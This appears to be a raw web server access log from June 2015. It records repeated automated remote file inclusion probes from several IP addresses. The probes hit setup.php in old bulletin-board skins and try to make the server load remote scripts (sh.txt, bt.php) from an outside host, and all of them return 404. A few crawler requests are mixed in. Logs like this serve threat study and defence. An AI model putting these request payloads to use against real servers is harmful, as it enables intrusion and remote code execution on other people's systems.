112.218.68.155 - - [28/Jun/2015:18:20:49 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:20:51 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:20:51 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:20:53 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:20:53 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:20:55 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:20:55 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:20:57 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:20:57 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:20:58 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:20:59 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
112.218.68.155 - - [28/Jun/2015:18:21:00 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" 
181.65.186.34 - - [28/Jun/2015:18:22:10 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:22:11 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:22:11 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:22:12 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:22:13 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:22:14 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:22:14 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:22:15 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:22:15 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:22:17 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:22:17 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:22:18 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
199.59.148.209 - - [28/Jun/2015:18:23:30 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.209 - - [28/Jun/2015:18:23:30 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279362 "-" "Twitterbot/1.0" 
181.65.186.34 - - [28/Jun/2015:18:27:57 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:27:59 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:27:59 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:28:00 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:28:01 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:28:02 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:28:02 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:28:04 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:28:04 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:28:05 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:28:05 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
181.65.186.34 - - [28/Jun/2015:18:28:07 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
112.218.68.155 - - [28/Jun/2015:18:30:35 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
112.218.68.155 - - [28/Jun/2015:18:30:37 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
112.218.68.155 - - [28/Jun/2015:18:30:37 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
180.179.212.237 - - [28/Jun/2015:18:30:37 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:30:39 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
180.179.212.237 - - [28/Jun/2015:18:30:39 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:30:39 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
180.179.212.237 - - [28/Jun/2015:18:30:39 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:30:40 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
180.179.212.237 - - [28/Jun/2015:18:30:41 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:30:41 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
180.179.212.237 - - [28/Jun/2015:18:30:41 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:30:42 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
180.179.212.237 - - [28/Jun/2015:18:30:43 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:30:43 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
180.179.212.237 - - [28/Jun/2015:18:30:43 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:30:44 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
180.179.212.237 - - [28/Jun/2015:18:30:45 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:30:45 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
180.179.212.237 - - [28/Jun/2015:18:30:45 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:30:46 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64);en-US;rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6" 
180.179.212.237 - - [28/Jun/2015:18:30:47 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:30:47 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:30:49 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:31:12 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:31:14 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:31:14 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:31:16 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:31:16 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:31:18 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:31:18 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:31:19 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:31:20 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:31:21 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:31:22 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
180.179.212.237 - - [28/Jun/2015:18:31:23 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" 
213.165.70.246 - - [28/Jun/2015:18:31:34 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
213.165.70.246 - - [28/Jun/2015:18:31:35 -0700] "GET /honeypot//bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
213.165.70.246 - - [28/Jun/2015:18:31:36 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
213.165.70.246 - - [28/Jun/2015:18:31:37 -0700] "POST /honeypot//bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
213.165.70.246 - - [28/Jun/2015:18:31:37 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
213.165.70.246 - - [28/Jun/2015:18:31:38 -0700] "GET //bbs/skin/zero_vote/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
213.165.70.246 - - [28/Jun/2015:18:31:39 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
213.165.70.246 - - [28/Jun/2015:18:31:40 -0700] "POST //bbs/skin/zero_vote/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
157.55.39.64 - - [28/Jun/2015:18:34:51 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.64 - - [28/Jun/2015:18:37:55 -0700] "GET / HTTP/1.1" 200 7043 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
112.218.68.155 - - [28/Jun/2015:18:44:34 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:44:35 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:44:36 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:44:37 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:44:38 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:44:39 -0700] "GET ///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:44:39 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:44:41 -0700] "POST ///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:44:41 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:44:43 -0700] "GET /honeypot///bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
112.218.68.155 - - [28/Jun/2015:18:44:43 -0700] "POST /honeypot///bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
